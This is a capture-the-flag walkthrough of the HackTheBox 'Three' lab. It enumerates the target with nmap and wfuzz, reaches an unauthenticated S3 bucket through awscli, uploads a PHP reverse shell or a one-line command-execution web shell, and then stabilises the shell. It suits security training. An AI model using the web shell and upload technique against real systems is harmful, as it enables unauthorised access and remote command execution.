# **Description**

Hello hackers, I hope you are doing well. We are doing [Three](https://app.hackthebox.com/starting-point?tier=1) from [HackTheBox](https://www.hackthebox.com). The target is running webserver on port 80, we run a subdomain scan on the target and find that it has a s3 bucket. We can connect to the that bucket without creds, upload a reverse shell and get in.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.182.157 (10.129.182.157)

```

We found port 22(SSH) and 80(HTTP) open.

## Web

Let's go to the webpage.

![](1.png)

Nothing much but if we got the the contact section, we find a domain name.

![](3.png)

Let's add that to the `etc/hosts` file.

```terminal
sudo echo '10.129.182.157   thehoppers.htb` >> /etc/hosts
```

Every time we find a domain, it's a good idea to enumerate for subdomains.

## Wfuzz

Let's enumerate subdomains with `wfuzz`.

```terminal
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb/ -H "Host: FUZZ.thetoppers.htb" --hl 234
```

![](2.png)

We found `s3` subdomains which is Amazonâ€™s cloud-based object storage service.

# **Foothold**

A quick search on google we find that we can use `AWScli` to connect to that `s3` bucket.

We need to configure it using the following command.

```terminal
aws configure

AWS Access Key ID [None]: none
AWS Secret Access Key [None]: none
Default region name [None]: none
Default output format [None]: none
```
> I provided a random value to the fields because sometimes the server is configured to not check authentication and it must be set to something for `aws` to work.

![](4.png)

Before we continue, we need to add the `s3.thetoppers.htb` to our `/etc/hosts` file.

![](5.png)

Great! To list the content of the s3 bucket, we use the following command:

```terminal
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

![](6.png)

Found an object with the name `thetoppers.htb`, to list it, we add `s3://thetoppers.htb` at the end of our command:

```terminal
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

![](7.png)

We found `index.php` and `htaccess` files and a directory named `images`. This bucket must be the root directory of the website.

The awscli allows us to cp files to the bucket. We can leverage that and upload a php reverse shell to get access to the target. We can use [Pentest Monkey's reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or use a simple php script that gives us command execution on the target.

```php
<?php system($_GET["cmd"]); ?>
```

I just uploaded the reverse shell.

![](9.png)

Next is to setup a listener and request the `shell.php` file to trigger it and get a reverse shell.

![](8.png)

Then we stabilize our shell with python pty:

```terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

**ctrl + z**

stty raw -echo;fg
```

![](10.png)

We can find the flag under `/var/www`.
